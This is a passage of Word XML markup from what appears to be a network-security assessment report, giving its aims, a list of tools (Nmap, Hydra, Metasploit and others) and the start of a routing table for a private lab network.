        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66268BB2" w14:textId="65D52E3D" w:rsidR="00341658" w:rsidRDefault="0001375C" w:rsidP="008605B2">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc183984544"/>
      <w:r>
        <w:t>Aims</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="1F63FFA7" w14:textId="0C0810EC" w:rsidR="004D7B3D" w:rsidRPr="003E5D01" w:rsidRDefault="00495438" w:rsidP="00FE6275">
      <w:pPr>
        <w:spacing w:after="236"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">This report aims to </w:t>
      </w:r>
      <w:r w:rsidR="00845CC0" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">create a detailed network diagram showcasing all connected hosts and devices on the network including routers, modems, PCs, firewalls, and more.  </w:t>
      </w:r>
      <w:r w:rsidR="00133926" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>On top of this, a routing table will be produced displaying the IP addresses on the network as well as their hot ranges, network addresses, subnet</w:t>
      </w:r>
      <w:r w:rsidR="00E54A30" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ma</w:t>
      </w:r>
      <w:r w:rsidR="00133926" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">sks, and broadcast addresses. </w:t>
      </w:r>
      <w:r w:rsidR="00283677" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Finally, a security analysis of the network will be conducted and any vulnerabilities discovered will be reported in the paper. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E37AB87" w14:textId="612BF7A0" w:rsidR="0001375C" w:rsidRDefault="0001375C" w:rsidP="0001375C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc183984545"/>
      <w:r>
        <w:t>Tools Used</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="48AF647D" w14:textId="59BE5851" w:rsidR="00D45195" w:rsidRPr="003E5D01" w:rsidRDefault="00D45195" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kali Linux</w:t>
      </w:r>
      <w:r w:rsidR="00053E6C" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00DC3193" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>A Linux-based Operating System developed and designed for penetration testing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C8BCAC" w14:textId="59E05561" w:rsidR="00053E6C" w:rsidRPr="003E5D01" w:rsidRDefault="00053E6C" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nmap</w:t>
      </w:r>
      <w:r w:rsidR="00DC3193" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="004B1C97" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> network mapper</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9352A9" w14:textId="4E20C053" w:rsidR="00053E6C" w:rsidRPr="003E5D01" w:rsidRDefault="00053E6C" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Hydra</w:t>
      </w:r>
      <w:r w:rsidR="004B1C97" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:r w:rsidR="004B1C97" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  network login cracker</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0711539A" w14:textId="3B5AACDC" w:rsidR="00053E6C" w:rsidRPr="003E5D01" w:rsidRDefault="00053E6C" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r w:rsidR="004B1C97" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="004B1C97" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the web browser used for this report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1078B53C" w14:textId="0C2688A4" w:rsidR="009C1A03" w:rsidRPr="00053E6C" w:rsidRDefault="00053E6C" w:rsidP="00954CA0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Metasploit</w:t>
      </w:r>
      <w:r w:rsidR="004B1C97" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – </w:t>
      </w:r>
      <w:r w:rsidR="00FE7AC1" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="000E4109" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>third-party</w:t>
      </w:r>
      <w:r w:rsidR="00FE7AC1" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> exploit framework</w:t>
      </w:r>
      <w:r w:rsidR="009C1A03">
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="757EC697" w14:textId="79B85A7D" w:rsidR="009C1A03" w:rsidRDefault="005E001F" w:rsidP="009C1A03">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc183984546"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidR="00FE7AC1">
        <w:t xml:space="preserve">etwork </w:t>
      </w:r>
      <w:r w:rsidR="001B3F68">
        <w:t>Overview</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="69C4552F" w14:textId="4CAF5ACF" w:rsidR="004B323B" w:rsidRPr="00521489" w:rsidRDefault="004B323B" w:rsidP="004B323B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc183984547"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Network Diagram</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w14:paraId="2AB4FE03" w14:textId="687AE475" w:rsidR="00B83900" w:rsidRPr="00521489" w:rsidRDefault="0078672C" w:rsidP="00B83900">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4D9B390A" wp14:editId="29BCEA54">
            <wp:extent cx="4718304" cy="7469973"/>
            <wp:effectExtent l="0" t="0" r="6350" b="0"/>
            <wp:docPr id="298846064" name="Picture 1" descr="A computer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6064" name="Picture 1" descr="A computer screen shot of a computer"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4759205" cy="7534727"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB2A1E9" w14:textId="77777777" w:rsidR="004B323B" w:rsidRPr="00521489" w:rsidRDefault="004B323B" w:rsidP="00B83900">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="57E69D67" w14:textId="28074890" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="004B323B" w:rsidP="004B323B">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc183984548"/>
      <w:r w:rsidRPr="00521489">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Routing Table</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="868"/>
        <w:gridCol w:w="943"/>
        <w:gridCol w:w="1650"/>
        <w:gridCol w:w="1573"/>
        <w:gridCol w:w="1472"/>
        <w:gridCol w:w="1372"/>
        <w:gridCol w:w="1472"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E3376" w:rsidRPr="00521489" w14:paraId="3C735639" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0371BBE0" w14:textId="1531850A" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Device</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3D412DEF" w14:textId="6A621BDC" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Interface</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="088BEE16" w14:textId="1C19155D" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Subnet Address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7B3987AC" w14:textId="1097A9A8" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Subnet Mask</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6916CED6" w14:textId="3C3AB3A1" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>IP Address</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2B09E39A" w14:textId="4C15C5FF" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Default Gateway</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="356D4816" w14:textId="75150D6D" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Broadcast Address</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00693323" w:rsidRPr="00521489" w14:paraId="40741587" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:trPr>
          <w:trHeight w:val="647"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="358FCEBC" w14:textId="2DCAB728" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Router1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="68FACB93" w14:textId="0E46A2FC" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7860B8F7" w14:textId="1BBF549D" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.224/30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="31A4D185" w14:textId="44C07949" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1B06A37A" w14:textId="22FC997A" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.226</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="68BA2FB9" w14:textId="5ADE8990" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.225</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="49C5B315" w14:textId="257036DC" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.227</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00693323" w:rsidRPr="00521489" w14:paraId="12191F2D" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="01F5F5BF" w14:textId="77777777" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="53E15BA7" w14:textId="643C434B" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="07860983" w14:textId="2BB173C6" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>172.16.221.0/24</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3C27AA07" w14:textId="2162F4F8" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="58B2944D" w14:textId="4D1B7B66" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>172.16.221.237</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="55F02BEF" w14:textId="635CA708" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>172.16.221.16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79D2411E" w14:textId="390A54FD" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>172.16.221.255</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00693323" w:rsidRPr="00521489" w14:paraId="5CC043D7" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="51762E7C" w14:textId="77777777" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3DE23CDD" w14:textId="3DAB180E" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t xml:space="preserve">Eth3 </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
